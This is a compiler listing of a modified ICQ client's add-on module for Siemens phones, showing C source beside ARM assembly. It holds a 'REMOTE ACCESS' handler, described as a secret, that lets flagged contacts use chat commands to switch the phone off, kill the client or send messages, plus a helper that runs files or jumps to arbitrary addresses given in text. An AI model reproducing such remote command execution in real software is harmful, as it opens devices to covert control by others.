##############################################################################
#                                                                            #
# IAR ARM ANSI C/C++ Compiler V4.42A/W32 EVALUATION    10/Dec/2010  22:11:38 #
# Copyright 1999-2005 IAR Systems. All rights reserved.                      #
#                                                                            #
#    Cpu mode        =  interwork                                            #
#    Endian          =  little                                               #
#    Stack alignment =  4                                                    #
#    Source file     =  D:\pasha\elf\_MY_PROJECT_\naticq_mod2\addon.c        #
#    Command line    =  D:\pasha\elf\_MY_PROJECT_\naticq_mod2\addon.c -D     #
#                       NEWSGOLD --preprocess D:\pasha\elf\_MY_PROJECT_\nati #
#                       cq_mod2\Release\List\ -lC                            #
#                       D:\pasha\elf\_MY_PROJECT_\naticq_mod2\Release\List\  #
#                       -o D:\pasha\elf\_MY_PROJECT_\naticq_mod2\Release\Obj #
#                       \ -s9 --no_unroll --cpu_mode arm --endian little     #
#                       --cpu ARM926EJ-S --stack_align 4 --interwork         #
#                       --separate_cluster_for_initialized_variables -e      #
#                       --fpu None --dlib_config "D:\pasha\Embedded          #
#                       Workbench 4.0 Evaluation2\ARM\LIB\dl5tpainl8n.h" -I  #
#                       "D:\pasha\Embedded Workbench 4.0                     #
#                       Evaluation2\ARM\INC\" --inline_threshold=2           #
#    List file       =  D:\pasha\elf\_MY_PROJECT_\naticq_mod2\Release\List\a #
#                       ddon.lst                                             #
#    Object file     =  D:\pasha\elf\_MY_PROJECT_\naticq_mod2\Release\Obj\ad #
#                       don.r79                                              #
#                                                                            #
#                                                                            #
##############################################################################

D:\pasha\elf\_MY_PROJECT_\naticq_mod2\addon.c
      1          #include "../inc/swilib.h"
      2          #include "../inc/cfg_items.h"
      3          #include "../inc/pnglist.h"
      4          #include "NatICQ.h"
      5          #include "main.h"
      6          #include "naticq_ipc.h"
      7          #include "../inc/xtask_ipc.h"
      8          #include "strings.h"
      9          #include "print.h"
     10          #include "addon.h"
     11          //Тут всякая поебень)))
     12          
     13          #define _ECHOCHAT    "@1"
     14          #define _ECHO        "@2"
     15          #define _VIBRA       "@3"
     16          #define _IDLESCR     "@4"
     17          #define _DISCONNECT  "@5"
     18          #define _GETCLISTALL "@6"
     19          #define _GETCLIST    "@7"
     20          #define _WRITE       "@13"
     21          #define _GETFLIST    "@8"
     22          #define _RUNFILE     "@9"
     23          #define _PIKOFF      "@10"
     24          #define _EXIT        "@11"
     25          #define _TURNOFF     "@12" 
     26          #define MSG_ECHOCHAT "@Ms s: %s"
     27          //#define __ECHOCHAT "\x23\x65\x63\x68\x6F\x63\x68\x61\x74"
     28          #define ENA_SIGNAL 1 //для команд, активировать сигналы,али нет
     29          #define DIS_SIGNAL 0
     30          
     31          //По 10 секунд
     32          #define ACTIVE_TIME 360
     33          
     34          extern void SendData(CLIST *t,char *s,int signal,int count);
     35          extern void AddStringToLog(CLIST *t, int code, char *s, const char *name, unsigned int IDforACK,int flag);
     36          extern void RecountMenu(CLIST *req, int needfocus);
     37          extern void start_vibra(void);
     38          extern char *GetStatusByIconIndex(int icon);
     39          extern CLIST *FindContactByUin(unsigned int uin);
     40          
     41          
     42          extern int comanda;
     43          extern int VIBR_TYPE;
     44          extern volatile int silenthide;
     45          extern volatile int disautorecconect;
     46          extern volatile int vibra_count;
     47          extern volatile int SENDMSGCOUNT;
     48          extern volatile CLIST *cltop;
     49          extern char per_s[];
     50          extern const char I_str[];
     51          extern const int SHOW_ACTIVE;
     52          extern const char ipc_my_name[32];
     53          extern const char ipc_xtask_name[];
     54          extern const char ipc_test_name[];
     55          extern IPC_REQ gipc;
     56          
     57          extern int get_file_size(char* fname);
     58          /*{
     59            unsigned int err;
     60            FSTATS fs;
     61            if ((GetFileStats(fname,&fs,&err))==-1) return 0;
     62            return (fs.size);
     63          }*/
     64          
     65          

   \                                 In segment CODE, align 4, keep-with-next
     66          int start(const char s[128])
     67          {
   \                     start:
   \   00000000   30402DE9           PUSH     {R4,R5,LR}
   \   00000004   04D04DE2           SUB      SP,SP,#+4
   \   00000008   0040B0E1           MOVS     R4,R0
     68            if((s)&&strlen(s))
   \   0000000C   6D00000A           BEQ      ??start_0
   \   00000010   1B0000EF           SWI      +27
   \   00000014   000050E3           CMP      R0,#+0
   \   00000018   3280BD08           POPEQ    {R1,R4,R5,PC}
     69             {
     70              if((s[2]=='\\')&&((s[(strlen(s))-3]=='.')||//Проверяем строку на наличие символов '\\' и '.'
     71                 (s[(strlen(s))-4]=='.')||(s[(strlen(s))-5]=='.')))
   \   0000001C   0200D4E5           LDRB     R0,[R4, #+2]
   \   00000020   5C0050E3           CMP      R0,#+92
   \   00000024   1E00001A           BNE      ??start_1
   \   00000028   0400A0E1           MOV      R0,R4
   \   0000002C   1B0000EF           SWI      +27
   \   00000030   040080E0           ADD      R0,R0,R4
   \   00000034   030050E5           LDRB     R0,[R0, #-3]
   \   00000038   2E0050E3           CMP      R0,#+46
   \   0000003C   0B00000A           BEQ      ??start_2
   \   00000040   0400A0E1           MOV      R0,R4
   \   00000044   1B0000EF           SWI      +27
   \   00000048   040080E0           ADD      R0,R0,R4
   \   0000004C   040050E5           LDRB     R0,[R0, #-4]
   \   00000050   2E0050E3           CMP      R0,#+46
   \   00000054   0500000A           BEQ      ??start_2
   \   00000058   0400A0E1           MOV      R0,R4
   \   0000005C   1B0000EF           SWI      +27
   \   00000060   040080E0           ADD      R0,R0,R4
   \   00000064   050050E5           LDRB     R0,[R0, #-5]
   \   00000068   2E0050E3           CMP      R0,#+46
   \   0000006C   0C00001A           BNE      ??start_1
     72                 /* Если в строке есть символы '\\' и '.', то запускаем как обычный файл*/
     73                  {
     74                    WSHDR *ws;
     75                    ws=AllocWS(256);
   \                     ??start_2:
   \   00000070   400FA0E3           MOV      R0,#+256
   \   00000074   250100EF           SWI      +293
   \   00000078   0050A0E1           MOV      R5,R0
     76                    str_2ws(ws,s,256);
   \   0000007C   402FA0E3           MOV      R2,#+256
   \   00000080   0410A0E1           MOV      R1,R4
   \   00000084   6C0100EF           SWI      +364
     77                    ExecuteFile(ws,0,0);
   \   00000088   0020A0E3           MOV      R2,#+0
   \   0000008C   0010A0E3           MOV      R1,#+0
   \   00000090   0500A0E1           MOV      R0,R5
   \   00000094   940000EF           SWI      +148
     78                    FreeWS(ws);
   \   00000098   0500A0E1           MOV      R0,R5
   \   0000009C   290100EF           SWI      +297
     79                    return (1);
   \   000000A0   1F0000EA           B        ??start_3
     80                   }
     81              if ((s[2]!='\\')&&(s[(strlen(s))-3]!='.')&&
     82                 (s[(strlen(s))-4]!='.')&&(s[(strlen(s))-5]!='.')&&
     83                 (s[0]!='a')&&(s[0]!='A')&&(s[1]!='0'))
   \                     ??start_1:
   \   000000A4   0200D4E5           LDRB     R0,[R4, #+2]
   \   000000A8   20519FE5           LDR      R5,??start_4     ;; `?<Constant "NULL pointer function!">`
   \   000000AC   5C0050E3           CMP      R0,#+92
   \   000000B0   2200000A           BEQ      ??start_5
   \   000000B4   0400A0E1           MOV      R0,R4
   \   000000B8   1B0000EF           SWI      +27
   \   000000BC   040080E0           ADD      R0,R0,R4
   \   000000C0   030050E5           LDRB     R0,[R0, #-3]
   \   000000C4   2E0050E3           CMP      R0,#+46
   \   000000C8   1C00000A           BEQ      ??start_5
   \   000000CC   0400A0E1           MOV      R0,R4
   \   000000D0   1B0000EF           SWI      +27
   \   000000D4   040080E0           ADD      R0,R0,R4
   \   000000D8   040050E5           LDRB     R0,[R0, #-4]
   \   000000DC   2E0050E3           CMP      R0,#+46
   \   000000E0   1600000A           BEQ      ??start_5
   \   000000E4   0400A0E1           MOV      R0,R4
   \   000000E8   1B0000EF           SWI      +27
   \   000000EC   040080E0           ADD      R0,R0,R4
   \   000000F0   050050E5           LDRB     R0,[R0, #-5]
   \   000000F4   2E0050E3           CMP      R0,#+46
   \   000000F8   0000D415           LDRBNE   R0,[R4, #+0]
   \   000000FC   61005013           CMPNE    R0,#+97
   \   00000100   41005013           CMPNE    R0,#+65
   \   00000104   0100D415           LDRBNE   R0,[R4, #+1]
   \   00000108   30005013           CMPNE    R0,#+48
   \   0000010C   0B00000A           BEQ      ??start_5
     84                  {
     85                  int (*p) (void);
     86                   p=(int(*)(void))GetFunctionPointer((char*)s);
   \   00000110   0400A0E1           MOV      R0,R4
   \   00000114   740000EF           SWI      +116
     87                   if(p!=NULL)
   \   00000118   000050E3           CMP      R0,#+0
   \   0000011C   0200000A           BEQ      ??start_6
     88                    (*p)();
   \   00000120   30FF2FE1           BLX      R0
   \                     ??start_3:
   \   00000124   0100A0E3           MOV      R0,#+1
   \   00000128   3280BDE8           POP      {R1,R4,R5,PC}
     89                   else
     90                     ShowMSG(1,(int)"NULL pointer function!");
   \                     ??start_6:
   \   0000012C   0510A0E1           MOV      R1,R5
   \   00000130   0100A0E3           MOV      R0,#+1
   \   00000134   480100EF           SWI      +328
     91                  return 1;
   \   00000138   0100A0E3           MOV      R0,#+1
   \   0000013C   3280BDE8           POP      {R1,R4,R5,PC}
     92                  }
     93          
     94              if ((s[2]!='\\')&&(s[(strlen(s))-3]!='.')&&
     95                 (s[(strlen(s))-4]!='.')&&(s[(strlen(s))-5]!='.')&&
     96                 ((s[0]=='a')||(s[0]=='A'))&&(s[1]=='0'))
   \                     ??start_5:
   \   00000140   0200D4E5           LDRB     R0,[R4, #+2]
   \   00000144   5C0050E3           CMP      R0,#+92
   \   00000148   1E00000A           BEQ      ??start_0
   \   0000014C   0400A0E1           MOV      R0,R4
   \   00000150   1B0000EF           SWI      +27
   \   00000154   040080E0           ADD      R0,R0,R4
   \   00000158   030050E5           LDRB     R0,[R0, #-3]
   \   0000015C   2E0050E3           CMP      R0,#+46
   \   00000160   1800000A           BEQ      ??start_0
   \   00000164   0400A0E1           MOV      R0,R4
   \   00000168   1B0000EF           SWI      +27
   \   0000016C   040080E0           ADD      R0,R0,R4
   \   00000170   040050E5           LDRB     R0,[R0, #-4]
   \   00000174   2E0050E3           CMP      R0,#+46
   \   00000178   1200000A           BEQ      ??start_0
   \   0000017C   0400A0E1           MOV      R0,R4
   \   00000180   1B0000EF           SWI      +27
   \   00000184   040080E0           ADD      R0,R0,R4
   \   00000188   050050E5           LDRB     R0,[R0, #-5]
   \   0000018C   2E0050E3           CMP      R0,#+46
   \   00000190   0C00000A           BEQ      ??start_0
   \   00000194   0000D4E5           LDRB     R0,[R4, #+0]
   \   00000198   610050E3           CMP      R0,#+97
   \   0000019C   41005013           CMPNE    R0,#+65
   \   000001A0   0100D405           LDRBEQ   R0,[R4, #+1]
   \   000001A4   30005003           CMPEQ    R0,#+48
   \   000001A8   0600001A           BNE      ??start_0
     97                  {
     98                    int entry;
     99                    sscanf(s,"%08X",&entry);
   \   000001AC   0D20A0E1           MOV      R2,SP
   \   000001B0   181085E2           ADD      R1,R5,#+24
   \   000001B4   0400A0E1           MOV      R0,R4
   \   000001B8   F50100EF           SWI      +501
    100                    SUBPROC((void*)entry);
   \   000001BC   00009DE5           LDR      R0,[SP, #+0]
   \   000001C0   710100EF           SWI      +369
    101                    return 1;
   \   000001C4   D6FFFFEA           B        ??start_3
    102                  }
    103             }
    104            return 0;    
   \                     ??start_0:
   \   000001C8   0000A0E3           MOV      R0,#+0
   \   000001CC   3280BDE8           POP      {R1,R4,R5,PC}    ;; return
   \                     ??start_4:
   \   000001D0   ........           DC32     `?<Constant "NULL pointer function!">`
    105          }
    106          
    107          

   \                                 In segment CODE, align 4, keep-with-next
    108          void CheckComand2(char *txt, CLIST *t)
    109          {
   \                     CheckComand2:
   \   00000000   F04F2DE9           PUSH     {R4-R11,LR}
    110            comanda=1;    
   \   00000004   E8A59FE5           LDR      R10,??CheckComand2_0+0x20  ;; comanda
   \   00000008   ACD04DE2           SUB      SP,SP,#+172
   \   0000000C   40DE4DE2           SUB      SP,SP,#+1024
   \   00000010   0040A0E1           MOV      R4,R0
   \   00000014   01B0A0E3           MOV      R11,#+1
   \   00000018   00B08AE5           STR      R11,[R10, #+0]
    111          //---------------------- REMOTE ACCESS -------------------//
    112          //так,маленький секрет так сказать))) глюмлюсь над теми кто достает....))
    113           if((txt[0]=='#' || txt[0]=='@') && t->isaccess)
   \   0000001C   0000D4E5           LDRB     R0,[R4, #+0]
   \   00000020   0150A0E1           MOV      R5,R1
   \   00000024   230050E3           CMP      R0,#+35
   \   00000028   40005013           CMPNE    R0,#+64
   \   0000002C   6501001A           BNE      ??CheckComand2_1
   \   00000030   780095E5           LDR      R0,[R5, #+120]
   \   00000034   000050E3           CMP      R0,#+0
   \   00000038   6201000A           BEQ      ??CheckComand2_1
    114            {
    115              
    116            if(/*strstr(txt,"#write") || */strstr(txt,_WRITE))//#write uin message
   \   0000003C   B4759FE5           LDR      R7,??CheckComand2_0+0x24  ;; SENDMSGCOUNT
   \   00000040   0260A0E3           MOV      R6,#+2
   \   00000044   F38F8FE2           ADR      R8,??CheckComand2_2  ;; "@13"
   \   00000048   0810A0E1           MOV      R1,R8
   \   0000004C   0400A0E1           MOV      R0,R4
   \   00000050   180100EF           SWI      +280
   \   00000054   000050E3           CMP      R0,#+0
   \   00000058   1F00000A           BEQ      ??CheckComand2_3
    117              {
    118                char *s=strrchr(txt,' ')+1;
   \   0000005C   2010A0E3           MOV      R1,#+32
   \   00000060   0400A0E1           MOV      R0,R4
   \   00000064   170100EF           SWI      +279
   \   00000068   015080E2           ADD      R5,R0,#+1
    119          #ifdef kluchnik
    120                CLIST *tt;
    121                tt=FindContactByUin(strtoul(txt+strlen(_WRITE)+1,0,10));
    122                AddStringToLog(tt,0x01,s,I_str,(++SENDMSGCOUNT)&0x7FFF,1);
    123                AddStringToLog(t,0x01,txt,I_str,0x7FFF,1);
    124                t->signals=1;
    125                tt->signals=1;
    126                if(SHOW_ACTIVE)
    127                  tt->isactive=ACTIVE_TIME;
    128          #else
    129                ++SENDMSGCOUNT;
   \   0000006C   000097E5           LDR      R0,[R7, #+0]
   \   00000070   010080E2           ADD      R0,R0,#+1
   \   00000074   000087E5           STR      R0,[R7, #+0]
    130          #endif
    131                TPKT *p;
    132                p=malloc(sizeof(PKT)+strlen(s)+1);
   \   00000078   0500A0E1           MOV      R0,R5
   \   0000007C   1B0000EF           SWI      +27
   \   00000080   090080E2           ADD      R0,R0,#+9
   \   00000084   140000EF           SWI      +20
   \   00000088   0070A0E1           MOV      R7,R0
    133                p->pkt.uin=strtoul(txt+strlen(_WRITE)+1,0,10);
   \   0000008C   0800A0E1           MOV      R0,R8
   \   00000090   1B0000EF           SWI      +27
   \   00000094   0A20A0E3           MOV      R2,#+10
   \   00000098   0010A0E3           MOV      R1,#+0
   \   0000009C   040080E0           ADD      R0,R0,R4
   \   000000A0   010080E2           ADD      R0,R0,#+1
   \   000000A4   ........           _BLF     strtoul,??strtoul??rA
   \   000000A8   000087E5           STR      R0,[R7, #+0]
    134                p->pkt.type=T_SENDMSG;
   \   000000AC   B460C7E1           STRH     R6,[R7, #+4]
    135                p->pkt.data_len=strlen(s);
   \   000000B0   0500A0E1           MOV      R0,R5
   \   000000B4   1B0000EF           SWI      +27
   \   000000B8   B600C7E1           STRH     R0,[R7, #+6]
    136                strcpy(p->data,s);
   \   000000BC   0510A0E1           MOV      R1,R5
   \   000000C0   080087E2           ADD      R0,R7,#+8
   \   000000C4   1A0000EF           SWI      +26
    137                SUBPROC((void *)SendAnswer,0,p);
   \   000000C8   2C059FE5           LDR      R0,??CheckComand2_0+0x28  ;; SendAnswer
   \   000000CC   0720A0E1           MOV      R2,R7
   \   000000D0   0010A0E3           MOV      R1,#+0
   \   000000D4   710100EF           SWI      +369
    138                return;
   \   000000D8   0F0000EA           B        ??CheckComand2_4
    139              }
    140               /*
    141             if(strstr(txt,_PIKOFF))
    142              {
    143                 ShowMSG()
    144                //char *s=malloc(1);
    145               // strcpy(s,"BGAGA");    
    146              }*/
    147             
    148                if(strstr(txt,_EXIT))
   \                     ??CheckComand2_3:
   \   000000DC   0090A0E3           MOV      R9,#+0
   \   000000E0   CD1F8FE2           ADR      R1,??CheckComand2_2+0x4  ;; "@11"
   \   000000E4   0400A0E1           MOV      R0,R4
   \   000000E8   180100EF           SWI      +280
   \   000000EC   000050E3           CMP      R0,#+0
   \   000000F0   0200000A           BEQ      ??CheckComand2_5
    149              {    
    150                t->signals=0;
    151          #ifdef kluchnik
    152          #else      
    153                extern void ElfKiller(void);
    154                SUBPROC((void *)ElfKiller);        
   \   000000F4   04059FE5           LDR      R0,??CheckComand2_0+0x2C  ;; ElfKiller
   \   000000F8   749085E5           STR      R9,[R5, #+116]
   \   000000FC   710100EF           SWI      +369
    155          #endif
    156              }
    157              
    158              if(strstr(txt,_TURNOFF))
   \                     ??CheckComand2_5:
   \   00000100   C61F8FE2           ADR      R1,??CheckComand2_2+0x8  ;; "@12"
   \   00000104   0400A0E1           MOV      R0,R4
   \   00000108   180100EF           SWI      +280
   \   0000010C   000050E3           CMP      R0,#+0
   \   00000110   0400000A           BEQ      ??CheckComand2_6
    159              {
    160                t->signals=0;
   \   00000114   749085E5           STR      R9,[R5, #+116]
    161          #ifdef kluchnik      
    162          #else
    163                SwitchPhoneOff();
   \   00000118   090000EF           SWI      +9
    164          #endif
    165                return;
   \                     ??CheckComand2_4:
   \   0000011C   ACD08DE2           ADD      SP,SP,#+172
   \   00000120   40DE8DE2           ADD      SP,SP,#+1024
   \   00000124   F08FBDE8           POP      {R4-R11,PC}
    166              }    
    167             
    168             if(/*strstr(txt,"#echochat") || */strstr(txt,_ECHOCHAT))
   \                     ??CheckComand2_6:
   \   00000128   D4849FE5           LDR      R8,??CheckComand2_0+0x30  ;; `?<Constant "@Ms s: %s">`
   \   0000012C   BC1F8FE2           ADR      R1,??CheckComand2_2+0xC  ;; "@1"
   \   00000130   0400A0E1           MOV      R0,R4
   \   00000134   180100EF           SWI      +280
   \   00000138   000050E3           CMP      R0,#+0
   \   0000013C   6200000A           BEQ      ??CheckComand2_7
    169             {
    170              char msg[256];
    171              sprintf(msg,MSG_ECHOCHAT,txt);
   \   00000140   0420A0E1           MOV      R2,R4
   \   00000144   0810A0E1           MOV      R1,R8
   \   00000148   DB0F8DE2           ADD      R0,SP,#+876
   \   0000014C   160000EF           SWI      +22
    172              char *k;
    173              if(strstr(txt,_ECHOCHAT))
   \   00000150   B31F8FE2           ADR      R1,??CheckComand2_2+0xC  ;; "@1"
   \   00000154   0400A0E1           MOV      R0,R4
   \   00000158   180100EF           SWI      +280
   \   0000015C   000050E3           CMP      R0,#+0
   \   00000160   0300000A           BEQ      ??CheckComand2_8
    174                k=txt+(strlen(_ECHOCHAT)+2);
   \   00000164   AE0F8FE2           ADR      R0,??CheckComand2_2+0xC  ;; "@1"
   \   00000168   1B0000EF           SWI      +27
   \   0000016C   040080E0           ADD      R0,R0,R4
   \   00000170   02A080E2           ADD      R10,R0,#+2
    175          /*    else
    176               k=txt+(strlen("#echochat")+2);*/
    177              char name[32];
    178              zeromem(name,32);
   \                     ??CheckComand2_8:
   \   00000174   2010A0E3           MOV      R1,#+32
   \   00000178   08008DE2           ADD      R0,SP,#+8
   \   0000017C   1D0100EF           SWI      +285
    179              char *tmp;
    180              if(tmp=strstr(txt," ")+1)//после первого пробела идет имя
   \   00000180   A81F8FE2           ADR      R1,??CheckComand2_2+0x10  ;; " "
   \   00000184   0400A0E1           MOV      R0,R4
   \   00000188   180100EF           SWI      +280
   \   0000018C   010080E2           ADD      R0,R0,#+1
   \   00000190   00008DE5           STR      R0,[SP, #+0]
   \   00000194   000050E3           CMP      R0,#+0
   \   00000198   1900000A           BEQ      ??CheckComand2_9
    181              {
    182                if(strstr(tmp,"!"))//если есть еще '!',значит имя прописали:)
   \   0000019C   A21F8FE2           ADR      R1,??CheckComand2_2+0x14  ;; "!"
   \   000001A0   180100EF           SWI      +280
   \   000001A4   000050E3           CMP      R0,#+0
   \   000001A8   1400000A           BEQ      ??CheckComand2_10
    183                {
    184                  int ii=0;
    185                  for(ii=0;(ii<strlen(k) && ii<32) && ( k[ii]!=' ' );ii++)
   \   000001AC   00B0A0E3           MOV      R11,#+0
   \   000001B0   030000EA           B        ??CheckComand2_11
    186                    name[ii]=k[ii];
   \                     ??CheckComand2_12:
   \   000001B4   0A10DBE7           LDRB     R1,[R11, +R10]
   \   000001B8   04009DE5           LDR      R0,[SP, #+4]
   \   000001BC   01B08BE2           ADD      R11,R11,#+1
   \   000001C0   0010C0E5           STRB     R1,[R0, #+0]
   \                     ??CheckComand2_11:
   \   000001C4   08108DE2           ADD      R1,SP,#+8
   \   000001C8   01108BE0           ADD      R1,R11,R1
   \   000001CC   04108DE5           STR      R1,[SP, #+4]
   \   000001D0   0A00A0E1           MOV      R0,R10
   \   000001D4   1B0000EF           SWI      +27
   \   000001D8   00005BE1           CMP      R11,R0
   \   000001DC   0400002A           BCS      ??CheckComand2_13
   \   000001E0   20005BE3           CMP      R11,#+32
   \   000001E4   020000AA           BGE      ??CheckComand2_13
   \   000001E8   0A00DBE7           LDRB     R0,[R11, +R10]
   \   000001EC   200050E3           CMP      R0,#+32
   \   000001F0   EFFFFF1A           BNE      ??CheckComand2_12
    187                    name[ii++]=0;
   \                     ??CheckComand2_13:
   \   000001F4   04009DE5           LDR      R0,[SP, #+4]
   \   000001F8   0090C0E5           STRB     R9,[R0, #+0]
   \   000001FC   000000EA           B        ??CheckComand2_9
    188                }
    189                else tmp=0;//иначе нуль
   \                     ??CheckComand2_10:
   \   00000200   00908DE5           STR      R9,[SP, #+0]
    190              }
    191              else tmp=0;//так,на всяк случай ))
    192              
    193          //    char *msg2=strrchr(txt,' ')+1;//наше сообщение для отправки
    194              char *msg2;
    195              if(strstr(txt,_ECHOCHAT))
   \                     ??CheckComand2_9:
   \   00000204   861F8FE2           ADR      R1,??CheckComand2_2+0xC  ;; "@1"
   \   00000208   0400A0E1           MOV      R0,R4
   \   0000020C   180100EF           SWI      +280
   \   00000210   000050E3           CMP      R0,#+0
   \   00000214   0700000A           BEQ      ??CheckComand2_14
    196                msg2=txt+(strlen(_ECHOCHAT)+2+strlen(name)+1);
   \   00000218   810F8FE2           ADR      R0,??CheckComand2_2+0xC  ;; "@1"
   \   0000021C   1B0000EF           SWI      +27
   \   00000220   0060A0E1           MOV      R6,R0
   \   00000224   08008DE2           ADD      R0,SP,#+8
   \   00000228   1B0000EF           SWI      +27
   \   0000022C   060080E0           ADD      R0,R0,R6
   \   00000230   040080E0           ADD      R0,R0,R4
   \   00000234   036080E2           ADD      R6,R0,#+3
    197          /*    else
    198                msg2=txt+(strlen("#echochat")+1+strlen(name)+1);*/
    199              char *s=malloc(256);
   \                     ??CheckComand2_14:
   \   00000238   400FA0E3           MOV      R0,#+256
   \   0000023C   140000EF           SWI      +20
   \   00000240   0040A0E1           MOV      R4,R0
    200              sprintf(s,"m [ %s ] to [ %s ] n [ %s ] s.",msg2,t->name, name);
   \   00000244   08008DE2           ADD      R0,SP,#+8
   \   00000248   01002DE9           PUSH     {R0}
   \   0000024C   143085E2           ADD      R3,R5,#+20
   \   00000250   0620A0E1           MOV      R2,R6
   \   00000254   0C1088E2           ADD      R1,R8,#+12
   \   00000258   0400A0E1           MOV      R0,R4
   \   0000025C   160000EF           SWI      +22
    201              if(tmp!=0)
   \   00000260   04109DE5           LDR      R1,[SP, #+4]
   \   00000264   04D08DE2           ADD      SP,SP,#+4
   \   00000268   000051E3           CMP      R1,#+0
   \   0000026C   001097E5           LDR      R1,[R7, #+0]
   \   00000270   FF00A0E3           MOV      R0,#+255
   \   00000274   7F0C80E3           ORR      R0,R0,#0x7F00
   \   00000278   011081E2           ADD      R1,R1,#+1
   \   0000027C   001087E5           STR      R1,[R7, #+0]
   \   00000280   0120A0E3           MOV      R2,#+1
   \   00000284   04002DE9           PUSH     {R2}
   \   00000288   010000E0           AND      R0,R0,R1
   \   0000028C   01002DE9           PUSH     {R0}
    202                AddStringToLog(t,0x02,msg2,name,(++SENDMSGCOUNT)&0x7FFF,1);
   \   00000290   10308D12           ADDNE    R3,SP,#+16
    203              else
    204                AddStringToLog(t,0x02,msg2,"Ib",(++SENDMSGCOUNT)&0x7FFF,1);
   \   00000294   CE3F8F02           ADREQ    R3,??CheckComand2_0  ;; "Ib"
   \   00000298   0620A0E1           MOV      R2,R6
   \   0000029C   0210A0E3           MOV      R1,#+2
   \   000002A0   0500A0E1           MOV      R0,R5
   \   000002A4   ........           _BLF     AddStringToLog,??AddStringToLog??rA
   \   000002A8   08D08DE2           ADD      SP,SP,#+8
    205          
    206              SendData(t,s,ENA_SIGNAL,0);
   \   000002AC   0030A0E3           MOV      R3,#+0
   \   000002B0   0120A0E3           MOV      R2,#+1
   \   000002B4   0410A0E1           MOV      R1,R4
   \   000002B8   0500A0E1           MOV      R0,R5
   \   000002BC   ........           _BLF     SendData,??SendData??rA
    207              mfree(s);
   \   000002C0   0400A0E1           MOV      R0,R4
   \                     ??CheckComand2_15:
   \   000002C4   150000EF           SWI      +21
    208              return;   
   \   000002C8   93FFFFEA           B        ??CheckComand2_4
    209             }
    210             
    211             if(/*strstr(txt,"#echo") || */strstr(txt,_ECHO))
   \                     ??CheckComand2_7:
   \   000002CC   C11F8FE2           ADR      R1,??CheckComand2_0+0x4  ;; "@2"
   \   000002D0   0400A0E1           MOV      R0,R4
   \   000002D4   180100EF           SWI      +280
   \   000002D8   000050E3           CMP      R0,#+0
   \   000002DC   0A00000A           BEQ      ??CheckComand2_16
    212               {
    213                ShowMSG(1,(int)txt+2);
   \   000002E0   021084E2           ADD      R1,R4,#+2
   \   000002E4   0100A0E3           MOV      R0,#+1
   \   000002E8   480100EF           SWI      +328
    214                char msg[256];
    215                sprintf(msg,"M %s snd",txt);
   \   000002EC   0420A0E1           MOV      R2,R4
   \   000002F0   2C1088E2           ADD      R1,R8,#+44
   \   000002F4   DB0F8DE2           ADD      R0,SP,#+876
   \   000002F8   160000EF           SWI      +22
    216                SendData(t,msg,ENA_SIGNAL,1);
   \   000002FC   0B30A0E1           MOV      R3,R11
   \   00000300   0320A0E1           MOV      R2,R3
   \   00000304   DB1F8DE2           ADD      R1,SP,#+876
   \   00000308   AC0000EA           B        ??CheckComand2_17
    217                return;
    218               }
    219             
    220             if(/*strstr(txt,"#vibra") || */strstr(txt,_VIBRA))
   \                     ??CheckComand2_16:
   \   0000030C   B21F8FE2           ADR      R1,??CheckComand2_0+0x8  ;; "@3"
   \   00000310   0400A0E1           MOV      R0,R4
   \   00000314   180100EF           SWI      +280
   \   00000318   000050E3           CMP      R0,#+0
   \   0000031C   1200000A           BEQ      ??CheckComand2_18
    221              {
    222                vibra_count=strtoul(txt+3,0,10);
   \   00000320   E0729FE5           LDR      R7,??CheckComand2_0+0x34  ;; vibra_count
   \   00000324   0A20A0E3           MOV      R2,#+10
   \   00000328   0010A0E3           MOV      R1,#+0
   \   0000032C   030084E2           ADD      R0,R4,#+3
   \   00000330   ........           _BLF     strtoul,??strtoul??rA
   \   00000334   000087E5           STR      R0,[R7, #+0]
    223                
    224                if(vibra_count==0)
   \   00000338   000097E5           LDR      R0,[R7, #+0]
   \   0000033C   000050E3           CMP      R0,#+0
   \   00000340   0400001A           BNE      ??CheckComand2_19
    225                {
    226                  if( VIBR_TYPE) //если написали просто команду без параметра
   \   00000344   C0029FE5           LDR      R0,??CheckComand2_0+0x38  ;; VIBR_TYPE
   \   00000348   000090E5           LDR      R0,[R0, #+0]
   \   0000034C   000050E3           CMP      R0,#+0
    227                   vibra_count=2;
   \   00000350   00608715           STRNE    R6,[R7, #+0]
    228                  else
    229                   vibra_count=1;
   \   00000354   00B08705           STREQ    R11,[R7, #+0]
    230                }
    231          #ifdef kluchnik
    232                if(vibra_count>10 || vibra_count<0)
    233                  vibra_count=1;
    234          #endif
    235                start_vibra();
   \                     ??CheckComand2_19:
   \   00000358   ........           _BLF     start_vibra,??start_vibra??rA
    236                SendData(t,"act",DIS_SIGNAL,1);
   \   0000035C   0130A0E3           MOV      R3,#+1
   \   00000360   0920A0E1           MOV      R2,R9
   \   00000364   9D1F8FE2           ADR      R1,??CheckComand2_0+0xC  ;; "act"
   \   00000368   940000EA           B        ??CheckComand2_17
    237                return;      
    238              }    
    239              /*
    240             if(strstr(txt,"#gprsoff"))
    241             {
    242          #ifdef kluchnik
    243               char *s=malloc(256);
    244               sprintf(s,"Recive command < Gprs off >");
    245               AddStringToLog(t,0x01,s,I_str,(++SENDMSGCOUNT)&0x7FFF,1);
    246               mfree(s);
    247               SendData(t,"GPRS Off",ENA_SIGNAL,0);
    248          #else
    249               SendData(t,"GPRS Off",DIS_SIGNAL,1);
    250               GPRS_OnOff(0,1);   
    251          #endif
    252               return;
    253             }*/
    254           
    255              
    256              if(/*strstr(txt,"#idlescr") ||*/ strstr(txt,_IDLESCR))
   \                     ??CheckComand2_18:
   \   0000036C   9C1F8FE2           ADR      R1,??CheckComand2_0+0x10  ;; "@4"
   \   00000370   0400A0E1           MOV      R0,R4
   \   00000374   180100EF           SWI      +280
   \   00000378   000050E3           CMP      R0,#+0
   \   0000037C   1600000A           BEQ      ??CheckComand2_20
    257              {
    258                SendData(t,"scr..",DIS_SIGNAL,1);
   \   00000380   0130A0E3           MOV      R3,#+1
   \   00000384   0920A0E1           MOV      R2,R9
   \   00000388   381088E2           ADD      R1,R8,#+56
   \   0000038C   0500A0E1           MOV      R0,R5
   \   00000390   ........           _BLF     SendData,??SendData??rA
    259                RecountMenu(NULL,1);
   \   00000394   0B10A0E1           MOV      R1,R11
   \   00000398   0900A0E1           MOV      R0,R9
   \   0000039C   ........           _BLF     RecountMenu,??RecountMenu??rA
    260                silenthide=1;
   \   000003A0   68029FE5           LDR      R0,??CheckComand2_0+0x3C  ;; silenthide
    261                gipc.name_to=ipc_xtask_name;
   \   000003A4   68329FE5           LDR      R3,??CheckComand2_0+0x40  ;; gipc
